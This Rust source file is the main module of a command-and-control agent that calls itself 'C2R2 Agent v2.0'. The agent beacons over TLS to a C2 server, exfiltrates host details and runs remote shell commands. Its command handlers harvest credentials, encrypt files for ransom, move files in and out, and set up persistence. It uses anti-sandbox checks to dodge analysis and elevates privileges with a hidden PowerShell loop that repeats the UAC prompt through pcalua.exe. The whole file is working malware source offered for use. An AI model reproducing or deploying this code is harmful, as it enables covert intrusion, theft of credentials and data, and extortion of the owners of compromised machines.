// Conditional windows subsystem: console for dev, windows (no console) for production
#![cfg_attr(feature = "production", windows_subsystem = "windows")]
#![cfg_attr(not(feature = "production"), windows_subsystem = "console")]

// Use system allocator (HeapAlloc). Works both in normal execution and
// when reflectively loaded (no PE TLS / __declspec(thread) dependency).
#[global_allocator]
static GLOBAL: std::alloc::System = std::alloc::System;

// Macro for conditional debug printing
// In production mode, this compiles to nothing
// In dev mode, it prints to stdout
#[macro_export]
macro_rules! debug_print {
    ($($arg:tt)*) => {
        #[cfg(feature = "dev")]
        {
            println!($($arg)*);
        }
    };
}

mod beacon;
mod config;
mod evasion;
mod persistence;
mod persistence_fileless;
mod syscalls;
mod tls_config;

use std::env;
#[cfg(target_os = "windows")]
use std::ffi::CStr;
use std::fs;
use std::io::{BufRead, BufReader, ErrorKind, Read, Write};
use std::net::TcpStream;
use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Duration;

use rustls::ClientConfig;

const DELIMITER: &str = "\n<<END>>\n";

// Global current working directory for the agent
lazy_static::lazy_static! {
    static ref CURRENT_DIR: Mutex<PathBuf> = {
        // Initialize with the current working directory or a default
        let initial_dir = env::current_dir().unwrap_or_else(|_| {
            #[cfg(target_os = "windows")]
            {
                PathBuf::from("C:\\")
            }
            #[cfg(not(target_os = "windows"))]
            {
                PathBuf::from("/")
            }
        });
        Mutex::new(initial_dir)
    };
}

/// Máximo de timeouts consecutivos antes de forzar reconexión.
/// Sirve para detectar conexiones muertas cuando el servidor se cierra.
/// 3 timeouts x 5 min = 15 min máximo antes de reconectar.
const MAX_CONSECUTIVE_TIMEOUTS: u32 = 3;

/// Configura TCP keepalive para prevenir que la conexión se cierre por inactividad.
/// Esto es crítico para mantener sesiones estables a través de NAT/firewalls.
fn configure_tcp_keepalive(stream: &TcpStream) -> std::io::Result<()> {
    // Configurar keepalive usando APIs de Windows
    #[cfg(target_os = "windows")]
    {
        use std::os::windows::io::AsRawSocket;
        use winapi::um::winsock2::{setsockopt, SOCKET, SOL_SOCKET, SO_KEEPALIVE};

        unsafe {
            let socket = stream.as_raw_socket() as SOCKET;
            let keepalive: u32 = 1; // Habilitar keepalive
            let result = setsockopt(
                socket,
                SOL_SOCKET,
                SO_KEEPALIVE,
                &keepalive as *const _ as *const i8,
                std::mem::size_of::<u32>() as i32,
            );

            if result != 0 {
                return Err(std::io::Error::last_os_error());
            }
        }
    }

    #[cfg(not(target_os = "windows"))]
    {
        // En Linux/Unix, el keepalive se puede configurar via setsockopt también
        // Por ahora, solo retornamos Ok() para non-Windows
    }

    Ok(())
}

/// Crea la configuración TLS para el cliente
/// Acepta certificados auto-firmados (necesario para C2)
fn create_tls_config() -> Arc<ClientConfig> {
    Arc::new(tls_config::create_client_config())
}

fn main() {
    debug_print!("DEBUG: C2R2 Agent v2.0 - Beacon Mode (TLS)");

    // ============================================================================
    // ANTI-SANDBOX CHECKS (Production Mode Only)
    // ============================================================================
    // In production mode, perform comprehensive anti-analysis checks
    // If sandbox/VM/debugger is detected, exit silently to evade analysis
    #[cfg(feature = "production")]
    {
        if evasion::run_anti_sandbox_checks() {
            // Sandbox detected - exit silently without any indication
            // This prevents analysis in automated sandbox environments
            std::process::exit(0);
        }
    }

    // ============================================================================
    // AUTO-PERSISTENCE (Background Thread)
    // ============================================================================
    // Schedule automatic persistence to be established after 3-5 minutes
    // This runs in a background thread with timing jitter for evasion
    // Features:
    // - Random delay (anti-behavioral analysis)
    // - Environment keying (anti-sandbox)
    // - Marker file (prevents re-persistence)
    // - Registry method (no UAC, reliable)
    persistence::schedule_auto_persistence();
    debug_print!("DEBUG: Auto-persistence scheduled");

    // Get server address from patchable config (supports binary patching)
    let c2_server = config::get_c2_server();
    debug_print!("DEBUG: Conectando (TLS) a {}", c2_server);

    // Crear configuración TLS
    let tls_config = create_tls_config();

    // Configuración de beacon (60s con 30% jitter por defecto)
    let beacon_config = beacon::BeaconConfig::default();
    let mut retry_count = 0;

    loop {
        // Extraer host y puerto del servidor
        let (host, _port) = match c2_server.rsplit_once(':') {
            Some((h, p)) => (h, p),
            None => {
                debug_print!("DEBUG: Formato de servidor inválido: {}", c2_server);
                thread::sleep(Duration::from_secs(5));
                continue;
            }
        };

        match TcpStream::connect(c2_server) {
            Ok(tcp_stream) => {
                debug_print!("DEBUG: Conexión TCP establecida");

                // Configurar TCP keepalive para mantener la conexión viva
                if let Err(e) = configure_tcp_keepalive(&tcp_stream) {
                    debug_print!(
                        "DEBUG: Warning - No se pudo configurar TCP keepalive: {}",
                        e
                    );
                }

                // Crear conexión TLS
                let server_name = match rustls::pki_types::ServerName::try_from(host.to_string()) {
                    Ok(name) => name,
                    Err(e) => {
                        debug_print!("DEBUG: Error creando ServerName: {}", e);
                        // Intentar con "localhost" como fallback
                        match rustls::pki_types::ServerName::try_from("localhost".to_string()) {
                            Ok(name) => name,
                            Err(_) => continue,
                        }
                    }
                };

                let tls_conn = match rustls::ClientConnection::new(tls_config.clone(), server_name)
                {
                    Ok(conn) => conn,
                    Err(e) => {
                        debug_print!("DEBUG: Error creando conexión TLS: {}", e);
                        continue;
                    }
                };

                debug_print!("DEBUG: Iniciando conexión TLS...");

                retry_count = 0; // Reset retry counter on successful connection
                handle_tls_connection(tcp_stream, tls_conn, &beacon_config);
                debug_print!("DEBUG: Conexión TLS cerrada");
            }
            Err(e) => {
                debug_print!("DEBUG: Error de conexión TCP: {}", e);
            }
        }

        // Calcular intervalo de retry con exponential backoff
        let retry_interval = beacon::calculate_retry_interval(&beacon_config, retry_count);
        debug_print!(
            "DEBUG: Reintentando en {} segundos...",
            retry_interval.as_secs()
        );
        beacon::beacon_sleep(retry_interval);
        retry_count += 1;
    }
}

/// Wrapper para manejar lectura/escritura TLS de forma más sencilla
/// Posee tanto el TcpStream como la conexión TLS
struct TlsStreamWrapper {
    tcp_stream: TcpStream,
    tls_conn: rustls::ClientConnection,
}

impl TlsStreamWrapper {
    fn new(tcp_stream: TcpStream, tls_conn: rustls::ClientConnection) -> Self {
        Self {
            tcp_stream,
            tls_conn,
        }
    }

    fn read(&mut self, buf: &mut [u8]) -> std::io::Result<usize> {
        let mut stream = rustls::Stream::new(&mut self.tls_conn, &mut self.tcp_stream);
        stream.read(buf)
    }

    fn write_all(&mut self, buf: &[u8]) -> std::io::Result<()> {
        let mut stream = rustls::Stream::new(&mut self.tls_conn, &mut self.tcp_stream);
        stream.write_all(buf)
    }

    fn flush(&mut self) -> std::io::Result<()> {
        let mut stream = rustls::Stream::new(&mut self.tls_conn, &mut self.tcp_stream);
        stream.flush()
    }

    fn set_read_timeout(&self, dur: Option<Duration>) -> std::io::Result<()> {
        self.tcp_stream.set_read_timeout(dur)
    }

    fn set_write_timeout(&self, dur: Option<Duration>) -> std::io::Result<()> {
        self.tcp_stream.set_write_timeout(dur)
    }
}

fn handle_tls_connection(
    tcp_stream: TcpStream,
    tls_conn: rustls::ClientConnection,
    _beacon_config: &beacon::BeaconConfig,
) {
    let mut tls_wrapper = TlsStreamWrapper::new(tcp_stream, tls_conn);

    // Configurar timeouts
    let read_timeout = Duration::from_secs(300); // 5 minutos
    let write_timeout = Duration::from_secs(30); // 30 segundos

    if let Err(e) = tls_wrapper.set_read_timeout(Some(read_timeout)) {
        debug_print!("DEBUG: Warning - No se pudo configurar read timeout: {}", e);
    }

    if let Err(e) = tls_wrapper.set_write_timeout(Some(write_timeout)) {
        debug_print!(
            "DEBUG: Warning - No se pudo configurar write timeout: {}",
            e
        );
    }

    // Enviar información del sistema
    if !send_sysinfo_tls(&mut tls_wrapper) {
        debug_print!("DEBUG: Error enviando información del sistema");
        return;
    }

    // Buffer para lectura línea por línea
    let mut read_buffer = vec![0u8; 4096];
    let mut line_buffer = String::new();

    // Contador de timeouts consecutivos para detectar conexiones muertas
    // Si el servidor se cierra, el agente puede quedarse en un loop de timeouts
    // sin detectar que la conexión está muerta. Después de MAX_CONSECUTIVE_TIMEOUTS
    // timeouts sin recibir datos, asumimos que la conexión está muerta y reconectamos.
    let mut consecutive_timeouts: u32 = 0;

    loop {
        // Leer datos del stream TLS
        match tls_wrapper.read(&mut read_buffer) {
            Ok(0) => {
                debug_print!("DEBUG: Conexión cerrada por el servidor");
                break;
            }
            Ok(n) => {
                // Resetear contador de timeouts al recibir datos exitosamente
                consecutive_timeouts = 0;

                let data = String::from_utf8_lossy(&read_buffer[..n]);
                line_buffer.push_str(&data);

                // Procesar líneas completas
                while let Some(pos) = line_buffer.find('\n') {
                    let line = line_buffer[..pos].to_string();
                    line_buffer = line_buffer[pos + 1..].to_string();

                    let command = line.trim();
                    if command.is_empty() {
                        continue;
                    }

                    debug_print!("DEBUG: Comando recibido: {}", command);

                    // Procesar comando
                    let response = process_command(command);
                    if !response.is_empty() {
                        if !send_response_tls(&mut tls_wrapper, &response) {
                            debug_print!("DEBUG: Error enviando respuesta");
                            return;
                        }
                    }
                }
            }
            Err(e) => {
                if e.kind() == ErrorKind::TimedOut || e.kind() == ErrorKind::WouldBlock {
                    consecutive_timeouts += 1;
                    debug_print!(
                        "DEBUG: Read timeout ({}/{}), continuando...",
                        consecutive_timeouts,
                        MAX_CONSECUTIVE_TIMEOUTS
                    );

                    // Si alcanzamos el máximo de timeouts consecutivos, asumir conexión muerta
                    if consecutive_timeouts >= MAX_CONSECUTIVE_TIMEOUTS {
                        debug_print!("DEBUG: Máximo de timeouts consecutivos alcanzado, forzando reconexión...");
                        break;
                    }
                    continue;
                }
                debug_print!("DEBUG: Error de lectura TLS: {}", e);
                break;
            }
        }
    }
}

fn send_response_tls(tls_wrapper: &mut TlsStreamWrapper, response: &str) -> bool {
    if let Err(e) = tls_wrapper.write_all(response.as_bytes()) {
        debug_print!("DEBUG: Error escribiendo respuesta: {}", e);
        return false;
    }

    if let Err(e) = tls_wrapper.flush() {
        debug_print!("DEBUG: Error flush respuesta: {}", e);
        return false;
    }

    true
}

fn send_sysinfo_tls(tls_wrapper: &mut TlsStreamWrapper) -> bool {
    debug_print!("DEBUG: Recopilando información del sistema...");

    let hostname = get_system_info("hostname");
    let username = get_system_info("username");
    let os = get_system_info("os");
    let privileges = get_system_info("privileges");

    let sysinfo = format!(
        "__SYSINFO__:hostname:{}\n__SYSINFO__:username:{}\n__SYSINFO__:os:{}\n__SYSINFO__:privileges:{}\n",
        hostname, username, os, privileges
    );

    debug_print!("DEBUG: Enviando información del sistema...");

    if let Err(e) = tls_wrapper.write_all(sysinfo.as_bytes()) {
        debug_print!("DEBUG: Error escribiendo sysinfo: {}", e);
        return false;
    }

    if let Err(e) = tls_wrapper.flush() {
        debug_print!("DEBUG: Error flush sysinfo: {}", e);
        return false;
    }

    debug_print!("DEBUG: Información enviada exitosamente");
    true
}

/// Procesa un comando recibido y retorna la respuesta
fn process_command(command: &str) -> String {
    if command.starts_with("__PERSIST__:") {
        let method = command.strip_prefix("__PERSIST__:").unwrap_or("");
        debug_print!("DEBUG: Estableciendo persistencia: {}", method);
        handle_persistence(method)
    } else if command == "__PERSIST_REMOVE__" {
        debug_print!("DEBUG: Removiendo persistencia");
        handle_persistence_remove()
    } else if command.starts_with("__BEACON__:") {
        let config_str = command.strip_prefix("__BEACON__:").unwrap_or("");
        debug_print!("DEBUG: Cambiando configuración beacon: {}", config_str);
        format!(
            "__INFO__:Configuración de beacon recibida (se aplicará en próxima reconexión): {}{}",
            config_str, DELIMITER
        )
    } else if command.starts_with("__LISTDIR__:") {
        let path = command.strip_prefix("__LISTDIR__:").unwrap_or("");
        debug_print!("DEBUG: Listando directorio: {}", path);
        list_directory(path)
    } else if command == "__LISTDIR__" {
        // List current directory if no path specified
        debug_print!("DEBUG: Listando directorio actual");
        let current = get_current_dir();
        list_directory(&current)
    } else if command.starts_with("__CD__:") {
        let path = command.strip_prefix("__CD__:").unwrap_or("");
        debug_print!("DEBUG: Cambiando directorio a: {}", path);
        change_directory(path)
    } else if command == "__PWD__" {
        debug_print!("DEBUG: Obteniendo directorio actual");
        get_pwd()
    } else if command.starts_with("__DOWNLOAD__:") {
        let path = command.strip_prefix("__DOWNLOAD__:").unwrap_or("");
        debug_print!("DEBUG: Descargando archivo: {}", path);
        download_file(path)
    } else if command.starts_with("__UPLOAD__|") {
        debug_print!("DEBUG: Procesando upload...");
        upload_file(command)
    } else if command == "__HARVEST__" {
        debug_print!("DEBUG: Harvesting credenciales...");
        harvest_credentials()
    } else if command.starts_with("__ENCRYPT__:") {
        let params = command.strip_prefix("__ENCRYPT__:").unwrap_or("");
        debug_print!("DEBUG: Encrypting files: {}", params);
        encrypt_files(params)
    } else if command.starts_with("__DECRYPT__:") {
        let params = command.strip_prefix("__DECRYPT__:").unwrap_or("");
        debug_print!("DEBUG: Decrypting files: {}", params);
        decrypt_files(params)
    } else if command.starts_with("__DELETE__:") {
        let path = command.strip_prefix("__DELETE__:").unwrap_or("");
        debug_print!("DEBUG: Deleting file/folder: {}", path);
        delete_path(path)
    } else if command == "__ELEVATE__" {
        debug_print!("DEBUG: Re-executing agent with admin privileges...");
        elevate_agent()
    } else if !command.is_empty() {
        let output = execute_command(command);
        format!("{}{}", output, DELIMITER)
    } else {
        String::new()
    }
}

// Legacy functions for non-TLS connections (kept for backwards compatibility reference)
// These are not used when TLS is enabled, but are kept in case TLS needs to be disabled

#[allow(dead_code)]
fn handle_connection(stream: TcpStream, _beacon_config: &beacon::BeaconConfig) {
    // Try to clone the stream, return early if it fails
    let reader_stream = match stream.try_clone() {
        Ok(s) => s,
        Err(e) => {
            debug_print!("DEBUG: Error cloning stream: {}", e);
            return;
        }
    };

    let mut reader = BufReader::new(reader_stream);
    let mut writer = stream;

    // Enviar información del sistema de una vez (blocking)
    if !send_sysinfo(&mut writer) {
        debug_print!("DEBUG: Error enviando información del sistema");
        return;
    }

    // Contador de timeouts consecutivos para detectar conexiones muertas
    let mut consecutive_timeouts: u32 = 0;

    let mut buffer = String::new();
    loop {
        match reader.read_line(&mut buffer) {
            Ok(0) => break,
            Ok(_) => {
                // Resetear contador de timeouts al recibir datos exitosamente
                consecutive_timeouts = 0;

                let command = buffer.trim();
                debug_print!("DEBUG: Comando recibido: {}", command);

                if command.starts_with("__PERSIST__:") {
                    // Comando de persistencia: __PERSIST__:registry|task|wmi|startup
                    let method = command.strip_prefix("__PERSIST__:").unwrap_or("");
                    debug_print!("DEBUG: Estableciendo persistencia: {}", method);
                    let response = handle_persistence(method);
                    if !send_response(&mut writer, &response) {
                        break;
                    }
                } else if command == "__PERSIST_REMOVE__" {
                    // Comando para remover persistencia
                    debug_print!("DEBUG: Removiendo persistencia");
                    let response = handle_persistence_remove();
                    if !send_response(&mut writer, &response) {
                        break;
                    }
                } else if command.starts_with("__BEACON__:") {
                    // Comando para cambiar configuración de beacon: __BEACON__:60:30
                    let config_str = command.strip_prefix("__BEACON__:").unwrap_or("");
                    debug_print!("DEBUG: Cambiando configuración beacon: {}", config_str);
                    let response = format!("__INFO__:Configuración de beacon recibida (se aplicará en próxima reconexión): {}{}", config_str, DELIMITER);
                    if !send_response(&mut writer, &response) {
                        break;
                    }
                    // Nota: la configuración real se aplicaría guardándola en un archivo
                    // pero para mantener simplicidad, solo informamos
                } else if command.starts_with("__DOWNLOAD__:") {
                    // Formato: __DOWNLOAD__:ruta_del_archivo
                    let path = command.strip_prefix("__DOWNLOAD__:").unwrap_or("");
                    debug_print!("DEBUG: Descargando archivo: {}", path);
                    let response = download_file(path);
                    if !send_response(&mut writer, &response) {
                        break;
                    }
                } else if command.starts_with("__UPLOAD__|") {
                    // Formato: __UPLOAD__|ruta_destino|datos_base64
                    debug_print!("DEBUG: Procesando upload...");
                    let response = upload_file(command);
                    if !send_response(&mut writer, &response) {
                        break;
                    }
                } else if command == "__HARVEST__" {
                    // Comando para robar credenciales usando DLL encriptada
                    debug_print!("DEBUG: Harvesting credenciales...");
                    let response = harvest_credentials();
                    if !send_response(&mut writer, &response) {
                        break;
                    }
                } else if command.starts_with("__ENCRYPT__:") {
                    // Comando para encriptar archivos: __ENCRYPT__:ruta|max_depth
                    let params = command.strip_prefix("__ENCRYPT__:").unwrap_or("");
                    debug_print!("DEBUG: Encrypting files: {}", params);
                    let response = encrypt_files(params);
                    if !send_response(&mut writer, &response) {
                        break;
                    }
                } else if command.starts_with("__DECRYPT__:") {
                    // Comando para desencriptar archivos: __DECRYPT__:ruta|key|max_depth
                    let params = command.strip_prefix("__DECRYPT__:").unwrap_or("");
                    debug_print!("DEBUG: Decrypting files: {}", params);
                    let response = decrypt_files(params);
                    if !send_response(&mut writer, &response) {
                        break;
                    }
                } else if command == "__ELEVATE__" {
                    // Comando para re-ejecutar el agente con privilegios elevados
                    debug_print!("DEBUG: Re-executing agent with admin privileges...");
                    let response = elevate_agent();
                    if !send_response(&mut writer, &response) {
                        break;
                    }
                    // Después de elevar, cerrar la conexión actual
                    // El agente elevado se conectará automáticamente
                    if response.contains("__SUCCESS__") {
                        debug_print!("DEBUG: Elevation successful, closing current connection");
                        break;
                    }
                } else if !command.is_empty() {
                    let output = execute_command(command);
                    let response = format!("{}{}", output, DELIMITER);
                    if !send_response(&mut writer, &response) {
                        break;
                    }
                }
                buffer.clear();
            }
            Err(e) => {
                // Si es timeout, simplemente continuar esperando comandos
                // Esto previene reconexiones innecesarias cuando no hay actividad
                if e.kind() == ErrorKind::TimedOut || e.kind() == ErrorKind::WouldBlock {
                    consecutive_timeouts += 1;
                    debug_print!(
                        "DEBUG: Read timeout ({}/{}), continuando...",
                        consecutive_timeouts,
                        MAX_CONSECUTIVE_TIMEOUTS
                    );

                    // Si alcanzamos el máximo de timeouts consecutivos, asumir conexión muerta
                    if consecutive_timeouts >= MAX_CONSECUTIVE_TIMEOUTS {
                        debug_print!("DEBUG: Máximo de timeouts consecutivos alcanzado, forzando reconexión...");
                        break;
                    }
                    continue;
                }
                // Para otros errores (conexión cerrada, etc.), salir
                debug_print!("DEBUG: Error de lectura: {}", e);
                break;
            }
        }
    }
}

/// Helper function to send a response to the C2 server (legacy, non-TLS)
/// Returns false if the connection is broken (write or flush failed)
#[allow(dead_code)]
fn send_response(writer: &mut TcpStream, response: &str) -> bool {
    if let Err(e) = writer.write_all(response.as_bytes()) {
        debug_print!("DEBUG: Error escribiendo respuesta: {}", e);
        return false;
    }

    if let Err(e) = writer.flush() {
        debug_print!("DEBUG: Error flush respuesta: {}", e);
        return false;
    }

    true
}

/// Legacy non-TLS sysinfo sender (kept for reference)
#[allow(dead_code)]
fn send_sysinfo(writer: &mut TcpStream) -> bool {
    debug_print!("DEBUG: Recopilando información del sistema...");

    // Recopilar toda la información de una vez
    let hostname = get_system_info("hostname");
    let username = get_system_info("username");
    let os = get_system_info("os");
    let privileges = get_system_info("privileges");

    // Enviar todo de una vez
    let sysinfo = format!(
        "__SYSINFO__:hostname:{}\n__SYSINFO__:username:{}\n__SYSINFO__:os:{}\n__SYSINFO__:privileges:{}\n",
        hostname, username, os, privileges
    );

    debug_print!("DEBUG: Enviando información del sistema...");

    // Check if write operation succeeds
    if let Err(e) = writer.write_all(sysinfo.as_bytes()) {
        debug_print!("DEBUG: Error escribiendo sysinfo: {}", e);
        return false;
    }

    // Check if flush operation succeeds
    if let Err(e) = writer.flush() {
        debug_print!("DEBUG: Error flush sysinfo: {}", e);
        return false;
    }

    debug_print!("DEBUG: Información enviada exitosamente");
    true
}

fn get_system_info(info_type: &str) -> String {
    #[cfg(target_os = "windows")]
    use std::os::windows::process::CommandExt;

    let output = match info_type {
        "hostname" => {
            #[cfg(target_os = "windows")]
            {
                Command::new("hostname")
                    .creation_flags(0x08000000) // CREATE_NO_WINDOW
                    .output()
            }
            #[cfg(not(target_os = "windows"))]
            {
                Command::new("hostname").output()
            }
        }
        "username" => {
            #[cfg(target_os = "windows")]
            {
                Command::new("cmd")
                    .args(&["/C", "echo %USERNAME%"])
                    .creation_flags(0x08000000) // CREATE_NO_WINDOW
                    .output()
            }
            #[cfg(not(target_os = "windows"))]
            {
                Command::new("whoami").output()
            }
        }
        "os" => {
            #[cfg(target_os = "windows")]
            {
                debug_print!("DEBUG: Intentando obtener OS info...");

                // Usar PowerShell para obtener el OS (más confiable)
                let ps_output = Command::new("powershell")
                    .args(&[
                        "-NoProfile",
                        "-NonInteractive",
                        "-WindowStyle",
                        "Hidden",
                        "-Command",
                        "(Get-CimInstance Win32_OperatingSystem).Caption",
                    ])
                    .creation_flags(0x08000000) // CREATE_NO_WINDOW
                    .output();

                if let Ok(out) = ps_output {
                    let os_name = String::from_utf8_lossy(&out.stdout).trim().to_string();
                    debug_print!("DEBUG: PowerShell OS output: '{}'", os_name);
                    if !os_name.is_empty() && os_name.to_lowercase().contains("windows") {
                        debug_print!("DEBUG: ✅ OS detectado: {}", os_name);
                        return os_name;
                    }
                }
                debug_print!("DEBUG: PowerShell falló, intentando registry...");

                // Fallback 1: Registry
                let registry_output = Command::new("cmd")
                    .args(&["/C", r#"reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName 2>nul"#])
                    .creation_flags(0x08000000)
                    .output();

                if let Ok(out) = registry_output {
                    let full_output = String::from_utf8_lossy(&out.stdout);
                    for line in full_output.lines() {
                        if line.contains("ProductName") && line.contains("REG_SZ") {
                            if let Some(os_name) = line.split("REG_SZ").nth(1) {
                                let trimmed = os_name.trim().to_string();
                                if !trimmed.is_empty() {
                                    debug_print!("DEBUG: ✅ OS detectado (registry): {}", trimmed);
                                    return trimmed;
                                }
                            }
                        }
                    }
                }
                debug_print!("DEBUG: Registry falló, intentando WMIC...");

                // Fallback 2: WMIC
                let wmic_output = Command::new("cmd")
                    .args(&["/C", "wmic os get Caption /value 2>nul"])
                    .creation_flags(0x08000000)
                    .output();

                if let Ok(out) = wmic_output {
                    let full_output = String::from_utf8_lossy(&out.stdout);
                    for line in full_output.lines() {
                        let line = line.trim();
                        if line.starts_with("Caption=") {
                            let os_name = line.strip_prefix("Caption=").unwrap_or("").trim();
                            if !os_name.is_empty() {
                                debug_print!("DEBUG: ✅ OS detectado (wmic): {}", os_name);
                                return os_name.to_string();
                            }
                        }
                    }
                }
                debug_print!("DEBUG: ❌ Todos los métodos fallaron");

                return "Windows".to_string(); // Fallback genérico
            }
            #[cfg(not(target_os = "windows"))]
            {
                Command::new("uname").args(&["-s", "-r"]).output()
            }
        }
        "privileges" => {
            #[cfg(target_os = "windows")]
            {
                Command::new("cmd")
                    .args(&["/C", "net session >nul 2>&1 && echo Admin || echo User"])
                    .creation_flags(0x08000000) // CREATE_NO_WINDOW
                    .output()
            }
            #[cfg(not(target_os = "windows"))]
            {
                Command::new("id").args(&["-u"]).output()
            }
        }
        _ => return String::new(),
    };

    match output {
        Ok(out) => String::from_utf8_lossy(&out.stdout).trim().to_string(),
        Err(_) => "Unknown".to_string(),
    }
}

fn execute_command(command: &str) -> String {
    debug_print!("DEBUG: Ejecutando comando: {}", command);

    // Use CREATE_NO_WINDOW flag (0x08000000) to hide command prompt window
    // This is critical for production mode to avoid detection
    #[cfg(target_os = "windows")]
    let output = {
        use std::os::windows::process::CommandExt;
        Command::new("cmd")
            .args(&["/C", command])
            .creation_flags(0x08000000) // CREATE_NO_WINDOW
            .output()
    };

    #[cfg(not(target_os = "windows"))]
    let output = Command::new("sh")
        .args(&["-c", command])
        .output();

    match output {
        Ok(out) => {
            let stdout = String::from_utf8_lossy(&out.stdout);
            let stderr = String::from_utf8_lossy(&out.stderr);
            format!("{}{}", stdout, stderr)
        }
        Err(e) => format!("Error: {}", e),
    }
}

/// Re-ejecuta el agente actual con privilegios elevados (UAC)
/// ANTES de elevar, copia el ejecutable a una ubicación sigilosa con nombre legítimo
/// Una vez elevado, el agente se conecta automáticamente con privilegios admin
/// y todos los comandos posteriores se ejecutan como admin sin pedir UAC de nuevo
/// MEJORADO: NO copia archivos (detectado por AVs), ejecuta desde ubicación original
#[cfg(target_os = "windows")]
fn elevate_agent() -> String {
    debug_print!(
        "DEBUG: Re-ejecutando agente con privilegios elevados (UAC prompt bombing + LOLBAS)..."
    );

    // Obtener la ruta del ejecutable actual
    let current_exe = match std::env::current_exe() {
        Ok(path) => path,
        Err(e) => {
            return format!(
                "__ERROR__:No se pudo obtener ruta del ejecutable: {}{}",
                e, DELIMITER
            )
        }
    };

    debug_print!("DEBUG: Ruta del agente actual: {}", current_exe.display());

    let exe_str = match current_exe.to_str() {
        Some(s) => s,
        None => return format!("__ERROR__:Ruta inválida{}", DELIMITER),
    };

    if let Ok(result) = elevate_agent_via_vbs(exe_str) {
        return result;
    };

    // si falla la elevación con pcalua.exe, retornar error
    format!(
        "__ERROR__:Falló la elevación del agente con UAC prompt bombing (LOLBAS){}",
        DELIMITER
    )
}

/*
FUNCIÓN DESHABILITADA: copy_to_stealth_location
Copiar archivos a ubicaciones "sigilosas" es detectado por AVs modernos como comportamiento sospechoso.
La nueva estrategia es:
1. NO copiar archivos
2. Ejecutar desde la ubicación original
3. Usar persistencia Registry/WMI que no requiere copias

/// Copia el ejecutable a una ubicación sigilosa con nombre legítimo
/// Ubica el ejecutable en carpetas del sistema que parecen legítimas
#[cfg(target_os = "windows")]
fn copy_to_stealth_location(current_exe: &std::path::Path) -> Result<std::path::PathBuf, String> {
    use std::fs;
    use std::path::PathBuf;

    // Obtener variables de entorno
    let appdata = std::env::var("APPDATA")
        .unwrap_or_else(|_| "C:\\Users\\Public".to_string());
    let localappdata = std::env::var("LOCALAPPDATA")
        .unwrap_or_else(|_| appdata.clone());

    // Ubicaciones sigilosas (parecen carpetas del sistema)
    let stealth_locations = [
        // Microsoft folders (más creíbles)
        (format!("{}\\Microsoft\\Windows\\Caches", localappdata), "WmiPrvSE.exe"),
        (format!("{}\\Microsoft\\Windows\\WER\\ReportQueue", localappdata), "conhost.exe"),
        (format!("{}\\Microsoft\\Edge\\User Data\\Default", localappdata), "msedge_proxy.exe"),
        (format!("{}\\Microsoft\\OneDrive\\logs", localappdata), "OneDriveStandaloneUpdater.exe"),

        // Adobe folders
        (format!("{}\\Adobe\\Acrobat\\DC\\Updater", appdata), "AdobeUpdateService.exe"),

        // System-like folders
        (format!("{}\\WindowsApps\\.cache", localappdata), "RuntimeBroker.exe"),
        (format!("{}\\Packages\\Microsoft.Windows.ShellExperienceHost", localappdata), "SystemSettingsBroker.exe"),
    ];

    // Intentar copiar a una de las ubicaciones
    for (dir, filename) in &stealth_locations {
        let stealth_dir = PathBuf::from(dir);

        // Crear directorio si no existe
        if let Err(_) = fs::create_dir_all(&stealth_dir) {
            continue; // Intentar siguiente ubicación
        }

        let stealth_path = stealth_dir.join(filename);

        // Intentar copiar
        if let Ok(_) = fs::copy(current_exe, &stealth_path) {
            debug_print!("DEBUG: ✅ Copiado exitosamente a: {}", stealth_path.display());

            // Intentar establecer atributos oculto/sistema usando attrib.exe (más simple)
            #[cfg(target_os = "windows")]
            {
                use std::os::windows::process::CommandExt;
                let _ = std::process::Command::new("attrib")
                    .args(&["+h", "+s", stealth_path.to_str().unwrap()])
                    .creation_flags(0x08000000) // CREATE_NO_WINDOW
                    .output();
            }

            return Ok(stealth_path);
        }
    }

    // Si ninguna ubicación funcionó, usar fallback en TEMP con nombre sigiloso
    let temp_dir = std::env::temp_dir();
    let fallback_names = [
        "svchost.exe",
        "dllhost.exe",
        "RuntimeBroker.exe",
        "taskhostw.exe",
    ];

    let pid = std::process::id() as usize;
    let fallback_name = fallback_names[pid % fallback_names.len()];
    let fallback_path = temp_dir.join(fallback_name);

    fs::copy(current_exe, &fallback_path)
        .map_err(|e| format!("Error copiando a fallback: {}", e))?;
    Ok(fallback_path)
}

*/

/// Re-ejecuta el agente usando pcalua.exe con UAC prompt bombing (LOLBAS)
/// Esta técnica usa el Program Compatibility Assistant (pcalua.exe) que es un binario
/// legítimo de Windows, haciéndolo menos sospechoso que PowerShell directo.
/// Además implementa "UAC prompt bombing" - sigue mostrando el prompt hasta que el usuario acepte.
#[cfg(target_os = "windows")]
fn elevate_agent_via_vbs(exe_path: &str) -> Result<String, String> {
    use std::os::windows::process::CommandExt;
    use std::process::Command;

    let temp_dir = std::env::temp_dir();
    let ps_name = format!("~elv{}.ps1", std::process::id());
    let ps_path = temp_dir.join(&ps_name);

    // Script PowerShell que usa pcalua.exe (LOLBAS) con UAC prompt bombing
    // pcalua.exe es el "Program Compatibility Assistant" - binario legítimo de Windows
    // El loop continúa mostrando el UAC prompt hasta que el usuario lo acepte
    let ps_content = format!(
        r#"try {{
    throw ""
}} catch {{
    while (-not $?) {{
        try {{
            Start-Process pcalua.exe -ArgumentList "-a `"{}`"" -Verb RunAs -ErrorAction Stop
            break
        }} catch {{
            Write-Error "" -ErrorAction SilentlyContinue
        }}
    }}
}}"#,
        exe_path.replace("\"", "`\"")
    );

    if let Err(_) = fs::write(&ps_path, ps_content) {
        return Err("Failed to create PowerShell script".to_string());
    }

    // Ejecutar el script de PowerShell en segundo plano
    // Esto iniciará el UAC prompt bombing
    let output = Command::new("powershell")
        .args(&[
            "-NoProfile",
            "-NonInteractive",
            "-ExecutionPolicy",
            "Bypass",
            "-WindowStyle",
            "Hidden",
            "-File",
            ps_path.to_str().unwrap(),
        ])
        .creation_flags(0x08000000) // CREATE_NO_WINDOW
        .spawn();

    // Limpiar archivo PowerShell después de un momento
    std::thread::sleep(std::time::Duration::from_millis(500));
    let _ = fs::remove_file(&ps_path);

    match output {
        Ok(_) => Ok(format!(
            "__SUCCESS__:Agente re-ejecutado con privilegios elevados (LOLBAS: pcalua.exe). UAC prompt se mostrará hasta que sea aceptado. Conexión actual se cerrará. El agente elevado se reconectará automáticamente.{}", 
            DELIMITER
        )),
        Err(e) => Err(format!("pcalua.exe elevation failed: {}", e)),
    }
}
// Function removed - only pcalua.exe (via elevate_agent_via_vbs) is used for elevation
